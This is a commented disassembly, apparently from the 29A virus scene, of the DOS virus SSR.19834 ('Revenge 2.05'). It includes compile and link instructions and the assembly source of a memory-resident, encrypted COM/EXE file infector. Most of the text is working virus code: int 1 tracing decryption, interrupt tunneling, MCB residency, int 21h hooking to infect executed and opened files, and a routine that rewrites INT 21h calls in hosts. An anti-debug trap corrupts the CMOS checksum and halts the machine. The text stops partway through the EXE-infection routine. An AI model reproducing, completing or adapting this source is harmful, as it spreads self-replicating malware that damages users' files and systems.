   ;
   ;                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                            ³     SSR.19834     ³
   ;                            ³  or Revenge 2.05  ³
   ;                            ³  Disassembled by  ³
   ;                            ³      Tcp/29A      ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; This is one of the biggest known  viruses and probably  the most encrypted
   ; one: four different polymorphic decryption bucles. Only these bucles waste
   ; more than 7k of code. About the virus itself, it has many interesting fea-
   ; tures, it was coded in a pretty uncommon way tho... there's code not used,
   ; it's not optimized, and has a lot of messages, apparently (i can't unders-
   ; tand russian :) messing with some AVers. This virus seems to be an attempt
   ; to laugh about the deficiencies of some antiviruses (and exploit them) ra-
   ; ther than writing a virus itself. By the end of the viral code, appear 921
   ; bytes i didn't include in the  disassembly as they have nothing to do with
   ; the virus, albeit they will be added to every infected file. I guess these
   ; bytes being copied are due to the fact that SSR left enough room for its 3
   ; engines and eventually forgot to readjust the size. The binary file inclu-
   ; ded in the \FILES directory is infected with an original copy of the virus
   ; and not with what you can get from the assembly of this file (because this
   ; source does not include the last 921 bytes of trash code).
   ;
   ; The code is commented enough so there's  nothing else to say... if anybody
   ; wants to read something more about the functioning of this virus, i recom-
   ; mend to have a look to what AVPVE says about previous versions of this vi-
   ; rus (there are some errors in the description tho).
   ;
   ;
   ; Other data
   ; ÄÄÄÄÄÄÄÄÄÄ
   ; Virus     : Revenge 2.05 (aka SSR.19834)
   ; Size      : 19834 (11645 code+engines; 5000+1500+768 decryptors; 921 shit)
   ; Author    : Stainless Steel Rat
   ; Origin    : Russia
   ; Disasm by : Tcp/29A
   ;
   ; Send any question or comment to tcp@cryogen.com.
   ;
   ;
   ; Compiling it
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Engines:
   ;  tasm /m res.asm
   ;  tasm /m ssrme.asm
   ;  tasm /m mme.asm
   ;
   ; Virus:
   ;  tasm /m ssr.asm
   ;  tlink ssr res ssrme mme
   ;  exe2bin ssr ssr.com
   ;
   ; - -[SSR.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
                   SSR     segment
                   assume  cs:SSR, ds:SSR, es:SSR, ss:SSR
                   org     0

   RES_DEC         =  768
   SSRME_DEC       = 5000
   MME_DEC         = 1500
   DECRYPTORS      = RES_DEC + SSRME_DEC + MME_DEC

   SHIT_AT_END     =  921

   SSR_SIZE        = ((virus_end-virus_start+15)/16)*16
   RES_SIZE        = ((911+15)/16)*16
   SSRME_SIZE      = ((1507+15)/16)*16
   MME_SIZE        = 1133

   VIRUS_SIZE      = SSR_SIZE+RES_SIZE+SSRME_SIZE+MME_SIZE+DECRYPTORS+SHIT_AT_END
   VIRUSCODE_SIZE  = VIRUS_SIZE - DECRYPTORS

   host:           jmp     virus_start     ; Infected host
                   org     100h                            ; Virus starts here

   virus_start:
                   call    next_instruction
   next_instruction:
           pop si
                   jmp     get_delta
           nop

                   db      'Hi Hacker! Welcome to Hell',0       ; Hi SSR! ;)

   get_delta:
                   sub     si,offset(next_instruction)
           push    ds
           pop es
           push    ds
           push    es
                   mov     cx,VIRUSCODE_SIZE-(decrypted_code-virus_start)
           nop
                   mov     di,offset(decrypted_code)
           add di,si
           push    es
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     ax,es:[1h*4]
                   mov     cs:[si+ofs_int1],ax     ; Read & save int1
                   mov     ax,es:[1h*4+2]
                   mov     cs:[si+seg_int1],ax
                   mov     ax,offset(int1_decryptor)
           add ax,si
                   mov     es:[1h*4],ax            ; Set new int1
                   mov     es:[1h*4+2],cs
           pushf
           pop ax
           shr ah,1
                   shl     ah,1                    ; AH:=xxx0
                   inc     ah                      ; AH:=xxx1 (trace flag on)
           push    ax
                   mov     al,cs:[si+starting_dec_selector]
                   mov     cs:[si+dec_selector],al
                   mov     al,cs:[si+i1_mask]
                   popf                            ; Trace flag on
                   loop    $                       ; Decrypt code via int1
           nop
           pop es
                   jmp     decrypted_code

   int1_decryptor:
                   push    ax
           push    cx
                   cmp     cx,0            ; All code decrypted?
                   jz      restore_i1      ; Yes? then jmp
           nop
           nop
           nop
                   call    select_dec_inst
           mov cl,al
                   mov     cs:[si+encrypt_decrypt],90h
   decrypt_instruction:
                   xor     cs:[di],al      ; Select instruction from table
   encrypt_decrypt db      90h             ; NOP for decryption
                                           ; RET for encryption
           inc di
           pop cx
           pop ax
           iret

   restore_i1:
                   add     sp,4
                   mov     ax,cs:[si+ofs_int1]     ; Restore original int1
                   mov     es:[1h*4],ax
                   mov     ax,cs:[si+seg_int1]
                   mov     es:[1h*4+2],ax
           retf    2

   i1_mask         db      0
   starting_dec_selector db      0
   ofs_int1        dw      0
   seg_int1        dw      0

   select_dec_inst:
           push    cx
           push    ax
           push    si
           push    di
           mov bx,si
                   mov     bp,offset(decryption_instructions)
                   mov     di,offset(decrypt_instruction)
           add di,si
           add si,bp
                   mov     al,cs:[bx+dec_selector]
           ror al,1
                   mov     cs:[bx+dec_selector],al
           and al,3
           mov cl,3
           mul cl
                   add     si,ax                   ; Select instruction
                   call    copy_instruction
           pop di
           pop si
           pop ax
           pop cx
           ret

   copy_instruction:
           push    ds
           push    es
           push    cs
           push    cs
           pop ds
           pop es
           cld
           mov cx,3
                   rep     movsb
           pop es
           pop ds
           ret

   dec_selector    db      0

   decryption_instructions:
                   sub     cs:[di],al
           add cs:[di],al
           xor cs:[di],al
           rol byte ptr cs:[di],cl

   decrypted_code:
                   cmp     cs:[si+host_type],1     ; Exe file?
                   je      host_exe                ; Yes? then jmp
           nop
           nop
           nop
                   mov     di,offset(header)
           add di,si
           push    si
           mov si,100h
           xchg    di,si
                   mov     cx,e_header_exe-header_exe
                   rep     movsb                   ; Restore host (COM)
           pop si
   host_exe:
           push    es
           xor ax,ax
           mov es,ax           ; ES:=0
           cmp es:[198h],0DEADh    ; Resident?
           pop es
                   jne     install_virus           ; No? then jmp
           nop
           nop
           nop
                   jmp     restore_exec_host

   install_virus:
           xor ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     ax,es:[30h*4+3]         ; Get int 21h segment (CP/M)
                   mov     [si+realseg_i2f],ax     ; Store for tunneling int 2Fh
                   mov     ax,es:[1h*4]            ; Offset int 1
                   mov     cs:[si+ofs_i1],ax       ; Store it
                   mov     ax,es:[1h*4+2]          ; Segment int 1
                   mov     cs:[si+seg_i1],ax       ; Store it
                   mov     ax,es:[2Fh*4]           ; Offset int 2Fh
                   mov     cs:[si+ofs_i2f],ax      ; Store it
                   mov     ax,es:[2Fh*4+2]         ; Segment int 2Fh
                   mov     cs:[si+seg_i2f],ax      ; Store it
                   mov     es:[1h*4],offset(int_1) ; Tunneler
           add es:[1h*4],si
           mov es:[1h*4+2],cs
           pushf
                   pop     ax                      ; AX:=flags
                   and     ah,0FEh
                   inc     ah                      ; Trace flag on
           push    ax
           popf
                   jmp     start_tunneling
           nop

                   db      'Move over, I said move over',0
                   db      'Hey, hey, hey, clear the way',0
                   db      'There''s no escape from my authority - I tell you -',0

   start_tunneling:
           mov ax,0ABCDh
           push    ds
           push    es
           push    si
                   pushf                           ; Simulated int 2Fh
                   db      9Ah                     ; call far
   ofs_i2f         dw      0
   seg_i2f         dw      0
                   pushf
                   pop     ax                      ; AX:=flags
                   and     ah,0FEh                 ; Trace flag off
           push    ax
                   popf                            ; Stop tunneling
           pop si
           pop es
           pop ds
                   mov     ax,cs:[si+ofs_i1]
                   mov     es:[1h*4],ax            ; Restore original int 1
                   mov     ax,cs:[si+seg_i1]
           mov es:[1h*4+2],ax
           xor bx,bx
           mov dx,bx
           mov ax,1300h
           push    ds
           push    es
           push    si
                   call    int_2f                  ; Get real int13h in DS:DX
           pop si
                   mov     cs:[si+ofs_i13],dx      ; Store it
                   mov     cs:[si+seg_i13],ds
                   mov     ax,1300h
           push    si
                   call    int_2f          ; Restore address from previous call
           pop si
           pop es
           pop ds
                   jmp     make_resident
                   nop

   ofs_i1          dw      0
   seg_i1          dw      0

   int_1:
           pushf
           push    si
                   call    getdelta_i1
   getdelta_i1:
           pop si
                   sub     si,offset(getdelta_i1)  ; Get delta-offset
           push    ax
           push    bp
           push    bx
           pushf
                   pop     bx                      ; Flags
           mov bp,sp
                   mov     ax,cs:[si+realseg_i2f]
                   cmp     [bp+0Ch],ax             ; Original int 2Fh segment?
                   jne     no_real_i2f             ; No? then jmp
           nop
           nop
           nop
                   mov     ax,[bp+0Ah]             ; Get int 2fh offset
                   mov     cs:[si+realofs_i2f],ax  ; Store it
                   mov     [bp+0Eh],bx             ; Flags
   no_real_i2f:
           pop bx
           pop bp
           pop ax
           pop si
           popf
           iret

   int_2f:
           pushf
                   db      9Ah     ; call far
   realofs_i2f     dw      0
   realseg_i2f     dw      0
                   ret

   make_resident:
                   mov     ax,ds
           dec ax
                   mov     es,ax                   ; ES->MCB
                   mov     dh,es:[0]               ; Get 'M' or 'Z'
                   mov     byte ptr es:[0],'M'     ; Mark current block as 'middle'
                   mov     bx,VIRUSCODE_SIZE+100h
           nop
           mov cl,4
                   shr     bx,cl                   ; div 16
           inc bx
           inc bx
                   add     bx,40000/16             ; Space for encryption buffers
                   sub     es:[3],bx
                   dec     word ptr es:[3]         ; Build a new MCB
                   add     ax,es:[3]
           inc ax
           mov es,ax
                   mov     es:[0],dh               ; Put 'M' or 'Z'
                   mov     word ptr es:[8],0       ; Block owner name
           inc ax
                   mov     es:[1],ax               ; Paragraph of owner
                   mov     es:[3],bx               ; Chain next MCB
                   add     ax,1
                   mov     es,ax
           push    si
                   xor     di,di
                   mov     cx,VIRUSCODE_SIZE
           nop
   l_copy_code:
                   mov     ah,cs:[si+100h]         ; Copy code to new MCB
           mov es:[di],ah
           inc si
           inc di
                   loop    l_copy_code
           pop si
           push    ds
           push    es
           pop ds
                   xor     ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     bx,es:[21h*4]           ; Get int 21h
           mov es,es:[21h*4+2]
                   mov     seg_i21-100h,es         ; Store it
                   mov     ofs_i21-100h,bx
                   mov     seg_i21_2-100h,es
                   mov     ofs_i21_2-100h,bx
                   mov     ax,es:[bx]      ; Read 2 bytes from int 21h entry
                   mov     _2bytes_21h-100h,ax     ; Store bytes
                   mov     es:[bx],0ACCDh          ; Change bytes to 'int 0ACh'
           pop es
           push    si
           push    cx
           xor si,si
                   mov     cx,int_24-virus_start
                   nop
                   in      al,40h                  ; Get random number
   l_crypt_memcode:
           push    cx
                   mov     mem_mask-100h,al        ; Store mask
                   mov     cl,al
                   add     [si],cl                 ; Encrypt code in memory
                   ror     byte ptr [si],cl
                   xor     [si],cl
           inc si
           pop cx
                   loop    l_crypt_memcode
           pop cx
           pop si
           xor ax,ax
                   mov     es,ax                           ; ES:=0
           cli
                   mov     es:[0ABh*4],offset(int_ab)-100h ; Set new int 0ABh
                   mov     es:[0ABh*4+2],ds
                   mov     es:[0ACh*4],offset(int_ac)-100h ; Set new int 0ACh
                   mov     es:[0ACh*4+2],ds
                   mov     es:[1Ch*4],offset(int_1c)-100h  ; Set new int 1Ch
           mov es:[1Ch*4+2],ds
                   mov     es:[6h*4],offset(int_6)-100h    ; Set new int 6
           mov es:[6h*4+2],ds
           sti
                   mov     _signature-100h,dx      ;??
                   mov     returnAX_fffn-100h,dx   ;??
                   jmp     restore_exec_host

   int_ab:
                   pushf
           push    ax
           push    bx
           push    cx
           push    dx
           push    bp
           push    si
           push    di
           push    ds
           push    es
           push    ax
                   mov     ax,':)'         ; Check if anyone is tracing
           push    ax
           cli
                   inc     sp
           inc sp
           nop
           dec sp
           dec sp
           sti
           pop ax
                   cmp     ax,':)'         ; Being traced?
                   je      no_tracing      ; No? then jmp
           nop
           nop
           nop
           mov al,2Eh
                   out     70h,al          ; CMOS: Select address 2Eh (checksum)
                   out     71h,al          ; CMOS: Write 2Eh (corrupt checksum)
                   cli
                   hlt                     ; Halt computer

   no_tracing:
           pop ax
           push    es
           push    ax
           xor ax,ax
                   mov     es,ax                   ; ES:=0
                   mov     es:[198h],0DEADh        ; Residency mark
                   mov     ax,cs:infection_count-100h
                   mov     es:[88h*4],ax   ; ??
           pop ax
           pop es
                   cmp     ax,4B00h        ; Exec?
                   je      try_to_infect   ; Yes? then jmp
           nop
           nop
           nop
                   cmp     ah,3Dh          ; Open?
                   je      try_to_infect   ; Yes? then jmp
           nop
           nop
           nop
                   cmp     ah,4Eh          ; Find-first (handle)?
                   jne     cmp_fn          ; No? then jmp
           nop
           nop
           nop
                   jmp     ff_fn

   cmp_fn:
                   cmp     ah,4Fh          ; Find-Next (handle)?
                   je      jmp_fffn        ; Yes? then jmp
                   jmp     popregs_iret

   jmp_fffn:
                   jmp     ff_fn

   try_to_infect:
                   mov     di,dx
                   call    convert2uppercase       ; Convert filename to uppercase
   search_extension:
           mov ah,[di]
                   cmp     ah,0            ; End of string?
                   jne     search_dot      ; No? then jmp
                   jmp     popregs_iret    ; Yes? then jmp (no dot)

   search_dot:
                   cmp     ah,'.'          ; Dot?
                   je      found_dot       ; Yes? then jmp
           nop
           nop
           nop
                   inc     di              ; Next char
                   jmp     search_extension

   found_dot:
           inc di
                   cmp     word ptr [di],'OC'      ; *.CO*?
                   jne     check_if_exe            ; No? then jmp
           nop
           nop
           nop
                   cmp     byte ptr [di+2],'M'     ; *.COM?
                   je      jmp_jmp_infect          ; Yes? then jmp
                   jmp     popregs_iret

   jmp_jmp_infect:
                   jmp     jmp_infect
           nop

   check_if_exe:
                   cmp     word ptr [di],'XE'      ; *.EX*?
                   je      maybe_exe               ; Yes? then jmp
                   jmp     popregs_iret

   maybe_exe:
                   cmp     byte ptr [di+2],'E'     ; *.EXE?
                   je      jmp_infect              ; Yes? then jmp
                   jmp     popregs_iret

   jmp_infect:
                   jmp     infect
           nop

                   db      'Gimme the prize, just gimme the prize',0

   infect:
           push    es
           push    ds
           push    dx
           mov cx,cs
           sub cx,10h
           mov ds,cx
                   mov     ax,3524h
                   call    int_21          ; Get int 24h
                   mov     ofs_i24,bx      ; Save it
                   mov     seg_i24,es
                   mov     dx,offset(int_24)
                   mov     ah,25h
                   call    int_21          ; Set new int 24h
           pop dx
           pop ds
           pop es
           push    ds
           push    dx
                   mov     ax,4300h
                   call    int_21          ; Get file attributes
                   jnc     reset_attr
           nop
           nop
           nop
           pop dx
           pop ds
                   jmp     restore_i24

   reset_attr:
                   mov     cs:attributes-100h,cx
                   mov     ax,4301h
                   xor     cx,cx
                   call    int_21          ; Reset attributes
                   jnc     check_name
           nop
           nop
           nop
           pop dx
           pop ds
                   jmp     restore_i24

   check_name:
                   call    check_valid_fname
           push    es
           xor ax,ax
                   mov     es,ax           ; ES:=0
                   mov     ax,es:[2Ah*4]   ; Get int 2Ah
                   mov     cs:ofs_i2a-100h,ax
                   mov     ax,es:[2Ah*4+2]
                   mov     cs:seg_i2a-100h,ax
                   mov     es:[2Ah*4],offset(int_2a)-100h  ; Set new int 2Ah
                   mov     es:[2Ah*4+2],cs
           mov di,dx
   l_search_ext:
                   cmp     byte ptr [di],'.'       ; Dot?
                   je      found_ext               ; Yes? then jmp
           nop
           nop
           nop
           inc di
                   jmp     l_search_ext

   found_ext:
                   mov     al,[di+1]               ; Get first char of extension
                   mov     cs:byte_ext-100h,al     ; Save it
                   mov     cs:ofs_byte_ext-100h,di ; and save its address
                   mov     cs:seg_byte_ext-100h,ds
                                                   ; BUG!!! Missing 'mov [di+1],xx'
           mov ax,3D02h
           push    es
                   call    int_21                  ; Open file I/O
           pop es
                   jnc     open_ok
           nop
           nop
           nop
                   call    restore_i2a
           pop es
                   jmp     restore_attr

   open_ok:
           push    ax
                   call    restore_i2a
           pop ax
           pop es
                   jmp     read_header
           nop

   int_2a:                                 ; Int 2Ah: Called by int 21h
                   cmp     ah,82h          ; End DOS critical sections 0-7 ?
                   jne     exit_i2a        ; No? then jmp
           nop
           nop
           nop
           push    es
           push    di
           push    ax
                   mov     di,cs:seg_byte_ext-100h ; Restore file extension
                   mov     es,di
                   mov     di,cs:ofs_byte_ext-100h
                   mov     al,cs:byte_ext-100h
                   mov     es:[di+1],al
           pop ax
           pop di
           pop es
   exit_i2a:
           iret

   ofs_byte_ext    dw      0
   seg_byte_ext    dw      0
   byte_ext        db      0
   ofs_i2a         dw      0
   seg_i2a         dw      0

   restore_i2a:
                   mov     ax,cs:ofs_i2a-100h      ; Restore int 2Ah
                   mov     es:[2Ah*4],ax
                   mov     ax,cs:seg_i2a-100h
                   mov     es:[2Ah*4+2],ax
           ret

   read_header:
                   mov     cx,cs
                   sub     cx,10h
                   mov     ds,cx           ; DS:=CS-10h
                   mov     bx,ax
                   mov     ah,3Fh
                   mov     cx,e_header_exe-header_exe
                   mov     dx,offset(header)
                   call    int_21          ; Read file header
                   jnc     get_timedate
                   jmp     close_file

   get_timedate:
           mov ax,5700h
                   call    int_21          ; Get file time/date
                   jnc     timedate_ok
                   jmp     close_file

   timedate_ok:
                   push    cx
                   mov     ax,dx           ; File date
           mov cl,5
           shr ax,cl
                   and     ax,0Fh          ; Get month
           mov dx,ax
                   pop     ax              ; File time
                   and     ax,1Fh          ; Get seconds
                   cmp     ax,dx           ; Infected? (seconds==month)
                   jne     check_header    ; No? then jmp
                   jmp     close_file

   check_header:
                   mov     file_month,dx           ; Save file month
                   cmp     _signature,'ZM'         ; Exe mark?
                   jne     cmp_mark2               ; No? then jmp
                   jmp     is_exe                  ; Yes? then jmp

   cmp_mark2:
                   cmp     _signature,'MZ'         ; Exe mark?
                   jne     is_com                  ; No? then jmp
                   jmp     is_exe                  ; Yes? then jmp

   is_com:
                   mov     host_type,0             ; COM file
                   call    check4pklite_com        ; PKLited file?
                   jc      no_pk_com               ; No? then jmp
           nop
           nop
           nop
           mov dx,190h
           mov ah,3Fh
                   call    lseekDX_functionAX      ; Lseek 190h & read a byte
                   add     encrypted_byte,53h      ; Encrypt it
           mov dx,190h
           mov ah,40h
                   call    lseekDX_functionAX      ; Lseek 190h & write the byte
                   mov     pklite_com,1            ; It's a pklited file
           mov dx,1
                   add     dx,inc_ofs_patch1       ; offset 2 for Pklite 1.50+
                                                   ; offset 1 for other versions
           xor cx,cx
           mov ax,4200h
                   call    int_21
                   jnc     patch_pklite_com
                   jmp     close_file

   patch_pklite_com:
                   mov     dx,offset(_FFFF)
           mov cx,2
                   mov     ah,40h
                   call    int_21          ; Patch file with a 0FFFFh to give
                                           ;  control to the out-of-memory routine
                   jnc     patch_pklite_com2
                   jmp     close_file

   patch_pklite_com2:
                   mov     dx,ofs_patchcom2        ; Offset of 2nd patch
                   xor     cx,cx
                   jmp     mark_encrypted

   no_pk_com:
                   mov     pklite_com,0            ; It isn't a pklited file
                   cmp     byte ptr header,0E9h    ; Start with a JMP?
                   jne     cmp_call                ; No? then jmp
           nop
           nop
           nop
                   mov     ax,word ptr header+1    ; Offset of jump
                   add     ax,3                    ; Destiny of jump
                   mov     jmp_dest,ax             ; This will be the entry point
                   mov     word ptr header,0EBAh
                   mov     encrypted_byte?,0FFh
           mov dx,190h
           mov ah,3Fh
                   call    lseekDX_functionAX      ; Lseek 190h and read a byte
                   add     encrypted_byte,53h      ; Encrypt it
           mov dx,190h
           mov ah,40h
                   call    lseekDX_functionAX      ; Lseek 190h and save the byte
                   jmp     mark_no_pkcom2
           nop

   cmp_call:
                   cmp     byte ptr header,0E8h    ; CALL?
                   jne     encrypt190              ; No? then jmp
           nop
           nop
           nop
                   mov     ax,word ptr header+1    ; Offset of call
                   add     ax,3                    ; Destiny of call
                   mov     jmp_dest,ax             ; This will be the entry point
                   mov     word ptr header,0EBAh
                   mov     encrypted_byte?,0
                   jmp     mark_no_pkcom2
           nop

   encrypt190:
           mov dx,190h
           mov ah,3Fh
                   call    lseekDX_functionAX      ; Lseek 190h and read a byte
                   add     encrypted_byte,53h      ; Encrypt it
           mov dx,190h
           mov ah,40h
                   call    lseekDX_functionAX      ; Lseek 190h and write the byte
                   jmp     mark_no_pkcom
           nop

   lseekDX_functionAX:
           push    ax
                   mov     ax,4200h
                   xor     cx,cx
                   call    int_21          ; Lseek start+DX
           pop ax
                   mov     dx,offset(encrypted_byte)
                   mov     cx,1
                   call    int_21          ; Perform AX function
           ret

   mark_no_pkcom:
                   xor     dx,dx
                   xor     cx,cx
                   mov     pklite_com,0
   mark_encrypted:
                   mov     jmp_dest,0
                   mov     encrypted_byte?,0FFh
                   jmp     check_com_size
           nop

   mark_no_pkcom2:
                   mov     pklite_com,0
                   xor     cx,cx
                   xor     dx,dx
   check_com_size:
           push    cx
           push    dx
                   mov     ax,4202h
                   xor     cx,cx
                   xor     dx,dx
                   call    int_21          ; Lseek end
           pop dx
           pop cx
                   cmp     ax,27434        ; Big file?
                   jb      cmp_little      ; No? then jmp
                   jmp     close_file

   cmp_little:
                   cmp     ax,400          ; Little file?
                   ja      size_ok         ; No? then jmp
                   jmp     close_file

   size_ok:
                   mov     cs:ofs_vircode-100h,ax          ; Calc runtime offset
                   add     cs:ofs_vircode-100h,100h
                   cmp     pklite_com,1    ; Pklited file?
                   jne     calc_ofs_jmp    ; No? then jmp
           nop
           nop
           nop
                   sub     ax,3            ; Calculate jmp to virus in pklite code
                   sub     ax,ofs_patchcom2
                   jmp     store_jmp_virus
           nop

   calc_ofs_jmp:
                   sub     ax,3            ; Jmp to virus in non-pklited file
   store_jmp_virus:
                   mov     jmp_vir_h,ah
                   mov     jmp_vir_l,al
                   mov     ax,4200h
                   call    int_21          ; Lseek to offset to patch
                   jnc     write_jmp
                   jmp     close_file

   write_jmp:
                   mov     ah,40h
                   mov     dx,offset(jmp_com)
                   mov     cx,3
                   call    int_21          ; Write jmp
                   jnc     jmp_append_code
                   jmp     close_file

   jmp_append_code:
                   jmp     append_code
           nop

                   db      'Save me,save me',0

   append_code:
                   mov     ax,4202h
                   xor     cx,cx
                   xor     dx,dx
                   call    int_21          ; Lseek end
                   mov     cx,VIRUSCODE_SIZE
           nop
                   mov     ax,0BA00h       ; Encryption buffer
                   mov     es,ax
           push    ds
           push    cs
           pop ds
                   xor     si,si
                   xor     di,di
                   rep     movsb           ; Copy code to encryption buffer
           pop ds
                   in      al,40h          ; Get random number
                   mov     es:starting_dec_selector-100h,al
                   mov     enc_selector,al
                   mov     cx,VIRUSCODE_SIZE-(decrypted_code-virus_start)
           nop
                   in      al,40h          ; Get random number
                   mov     es:i1_mask-100h,al
                   mov     di,offset(decrypted_code)
                   sub     di,100h
                   xor     dx,dx
   l_enc_i1:
                   call    encrypt_i1
           push    cx
           mov cl,al
   enc_inst:
                   nop
           nop
           nop
           pop cx
           inc di
                   loop    l_enc_i1
                   jmp     crypt_code_and_save

                   db      0
                   db      'Give me your WEBs, let me squeeze them in my hands,',0
                   db      'Your puny scaners,',0
                   db      'Your so-called heuristics analyzers,',0
                   db      'I''ll eat them whole before I''m done,',0
                   db      'The battle''s fought and the game is won,',0
                   db      'I am the one the only one,',0
                   db      'I am the god of kingdom come,',0

   crypt_code_and_save:
           push    ds
           push    es
           pop ds
           push    bx
                   mov     bx,cs:ofs_vircode-100h
           push    bx
                   add     bx,MME_DEC+SSRME_DEC
                   mov     ax,VIRUSCODE_SIZE
                   mov     cl,4            ; Prepare buffer
           shr ax,cl
           inc ax
           mov dx,cs
           add ax,dx
           mov es,ax
                   mov     cx,VIRUSCODE_SIZE
           nop
           xor dx,dx
           push    es
           push    ds
                   call    res_engine      ; Call engine
           pop es
           xor di,di
           xor si,si
           push    cx
           cld
                   rep     movsb
           pop cx
           push    es
           pop ds
           pop es
           pop bx
           push    bx
                   add     bx,MME_DEC
           push    es
           push    ds
                   call    ssrme_engine    ; Call engine
           pop es
           xor di,di
           xor si,si
           push    cx
           cld
                   rep     movsb
           pop cx
           push    es
           pop ds
           pop es
           pop bx
                   call    mme_engine      ; Call engine
           pop bx
           push    ds
           mov ah,40h
                   call    int_21          ; Write virus body to disk
           pop es
           pop ds
                   jnc     check_pkexe_snd
                   jmp     close_file

   check_pkexe_snd:
                   cmp     pklite_exe,1            ; PKLited EXE file?
                   jne     check_pkcom_snd         ; No? then jmp
                   jmp     set_infection_mark

   check_pkcom_snd:
                   cmp     pklite_com,1            ; PKLited COM file?
                   jne     check_tlink_snd         ; No? then jmp
                   jmp     set_infection_mark

   check_tlink_snd:
                   cmp     byte ptr word_ofs1C,1   ; Linked with Borland TLINK?
                   jne     check_lzexe_snd         ; No? then jmp
                   jmp     set_infection_mark

   check_lzexe_snd:
                   cmp     word_ofs1C,'ZL'         ; LZEXE file?
                   jne     jmp_SND                 ; No? then jmp
                   jmp     set_infection_mark

   jmp_SND:
                   jmp     SND
                   nop

                   db      'Seek aNd Destroy Technology [SND]',0

   SND:
           xor cx,cx
           xor dx,dx
           mov ax,4200h
                   call    int_21          ; Lseek start
           push    ds
           mov ax,0BA00h
                   mov     ds,ax           ; DS:=0BA00h
           mov ah,3Fh
           xor dx,dx
                   mov     cx,16*1024
                   call    int_21          ; Read 16KB from file
           push    ax
                   mov     cx,ax           ; CX:=number of bytes read
           xor di,di
   l_next_SND:
                   cmp     byte ptr [di],0B8h      ; MOV AX,xxxx?
                   je      cmp_movax_int21h        ; Yes? then jmp
           nop
           nop
           nop
                   cmp     byte ptr [di],0B4h      ; MOV AH,xx?
                   jne     next_SND                ; No? then jmp
           nop
           nop
           nop
                   cmp     word ptr [di+2],21CDh   ; INT 21h?
                   jne     next_SND
           nop
                   nop                             ; Found MOV AH,xx + INT 21h
           nop
                   mov     al,[di+1]               ; Get xx in MOV AH,xx
                   mov     byte ptr [di],0F0h      ; Int 6h when executed
           push    ax
                   call    get_random
                   and     ax,7                    ; AX in [0..7]
           mov bp,ax
                   mov     al,byte ptr cs:[bp+SND_table-100h]
                   mov     [di+1],al               ; Gen instruction
                   call    get_random
           mov [di+2],al
           mov dl,al
           pop ax
                   xor     al,dl                   ; Encrypt original byte
                   mov     [di+3],al               ; and store it
           add di,4
                   jmp     next_SND
           nop

   cmp_movax_int21h:
                   cmp     word ptr [di+3],21CDh   ; INT 21h?
                   jne     next_SND
           nop
           nop
           nop
                   mov     ax,[di+1]               ; xxxx in MOV AX,xxxx
                   mov     byte ptr [di],0F0h      ; Int 6h when executed
           push    ax
                   call    get_random
                   and     ax,7                    ; AX in [0..7]
           mov bp,ax
                   mov     al,byte ptr cs:[bp+SND_table-100h]
                   inc     al                      ; AL -> AX
                   mov     [di+1],al               ; Generate opcode
                   call    get_random
                   mov     [di+2],al               ; Random number
           mov dl,al
           mov dh,al
           pop ax
                   xor     ax,dx                   ; Encrypt original word
                   mov     [di+3],ax               ; and store it
           add di,5
   next_SND:
           inc di
                   loop    l_next_SND
           xor dx,dx
           xor cx,cx
                   mov     ax,4200h        ; Lseek start
                   call    int_21
           pop ax
           xor dx,dx
           mov cx,ax
           mov ah,40h
                   call    int_21          ; Write code
           pop ds
                   jmp     set_infection_mark
           nop

   get_random:
           pushf
                   in      al,40h          ; Get random number
           xor al,cs:[bx]
           ror al,cl
           add al,53h
           popf
                   ret

   SND_table:
                   db      3Ch     ; cmp al,xx (+1 = cmp ax,xxxx)
                   db      24h     ; and al,xx (+1 = and ax,xxxx)
                   db      14h     ; adc al,xx (+1 = adx ax,xxxx)
                   db      0Ch     ; or  al,xx (+1 = or  ax,xxxx)
                   db      34h     ; xor al,xx (+1 = xor ax,xxxx)
                   db      1Ch     ; sbb al,xx (+1 = sbb ax,xxxx)
                   db      2Ch     ; sub al,xx (+1 = sub ax,xxxx)
                   db      04h     ; add al,xx (+1 = add ax,xxxx)

   set_infection_mark:
           mov ax,5700h
                   call    int_21          ; Get file date/time
                   mov     ax,cx           ; file time
           mov cl,5
           shr ax,cl
                   shl     ax,cl           ; Clear seconds field
                   add     ax,file_month   ; Set infection mark (seconds=month)
           mov cx,ax
           mov ax,5701h
                   call    int_21          ; Set file date/time
                   jc      close_file
           nop
           nop
           nop
                   mov     pklite_exe,0
                   mov     pklite_com,0
                   jmp     close_infected
           nop

                   db      '- THERE CAN BE ONLY ONE -',0

   close_infected:
                   mov     ah,3Eh
                   call    int_21          ; Close file
                   inc     infection_count
                   jmp     restore_attr
                   nop

   close_file:
           mov ah,3Eh
                   call    int_21          ; Close file
   restore_attr:
                   mov     cx,attributes
           pop dx
           pop ds
           mov ax,4301h
                   call    int_21          ; Restore attributes

   restore_i24:
           push    ds
           mov ax,2524h
                   mov     dx,cs:ofs_i24-100h
                   mov     bx,cs:seg_i24-100h
           mov ds,bx
                   call    int_21          ; Restore int 24h
           pop ds
                   mov     pklite_exe,0
                   mov     pklite_com,0
           push    ds
           push    cs
           pop ax
           dec ax
           dec ax
           push    ax
           pop ds
                   inc     word ptr ds:[8]         ; Inc number of files processed
                   cmp     word ptr ds:[8],50      ; 50 files?
           pop ds
                   je      check_activation        ; Yes? then jmp
                   jmp     popregs_iret

   check_activation:
                   cmp     cs:tick_counter-100h,900*18 ; >=900 seconds? (>15 mins.)
                   jae     activation
                   jmp     popregs_iret

   activation:
                   mov     ax,cs
                   sub     ax,10h
                   mov     ds,ax                   ; DS:=CS-10h
                   call    print_REVENGE
                   jmp     popregs_iret

   is_exe:
                   mov     host_type,1             ; EXE file
                   call    check4pklite_exe        ; Pklited file?
                   jc      no_pk_exe               ; No? then jmp
           nop
           nop
           nop
                   jmp     pk_exe
                   nop

                   db      'I''M GOING SLIGHTLY MAD'

   pk_exe:
                   mov     pklite_exe,1            ; It's a pklited exe
                   jmp     process_exe
           nop

   no_pk_exe:
                   mov     pklite_exe,0            ; It isn't a pklited exe
   process_exe:
                   mov     cl,4
                   mov     dx,_hdrsize
                   shl     dx,cl                   ; *16 (Header size in bytes)
                   add     dx,512
                   mov     ah,3Fh
           push    dx
                   call    lseekDX_functionAX      ; Read a byte
